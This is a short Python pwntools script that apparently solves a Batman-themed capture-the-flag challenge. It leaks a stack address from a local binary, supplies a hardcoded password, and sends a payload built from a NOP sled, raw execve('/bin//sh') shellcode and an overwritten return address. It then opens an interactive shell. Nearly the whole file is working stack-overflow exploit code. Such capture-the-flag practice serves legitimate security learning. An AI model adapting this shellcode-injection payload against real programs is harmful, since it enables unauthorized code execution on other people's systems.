#!/usr/bin/python3
from pwn import *
import argparse
import re
context.log_level = 'DEBUG'
context(os='linux', arch='amd64')
e = context.binary = ELF("./bat",checksec=False)
exe = './bat'
#elf = context.binary = ELF(exe, checksec=False)

#p = e.debug(gdbscript="source /home/nick/global/halfdisp.py"
#+"\nbreak *setvbuf"
#   +"\nc"
#)
p = e.process()
p.sendlineafter(b'>',b'1')
stack_addr = p.recvline().strip().split()[-1]
stack_addr = ''.join([chr(int(stack_addr[i:i+2],16)) for i in range(2, len(stack_addr), 2)])
stack_addr = stack_addr.rjust(8, '\x00')
stack_addr = u64(stack_addr,endian='big')
#shellcode = asm(shellcraft.sh())
shellcode = asm(shellcraft.popad())

shellcode += asm(shellcraft.linux.cat('flag.txt'))
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
padding=b"\x90"*(84-len(shellcode))
stack_addr = p64(stack_addr)

payload = flat([
padding,
shellcode,
stack_addr
])

print("This is my shellcode")
print(hexdump(flat(b"padding\x00", shellcode)))
assert len(payload) <= 137, f'Payload "{len(payload)}" too long'
p.sendlineafter(b'>',b'2')
p.sendlineafter(b'Enter the password:',b'b4tp@$$w0rd!')
p.sendlineafter(b'Enter the navigation commands: ',payload)
#input('ida64')
p.sendlineafter(b'>',b'420')
#p.recvuntil("Too bad, now who's gonna save Gotham? Alfred?\n")

p.interactive()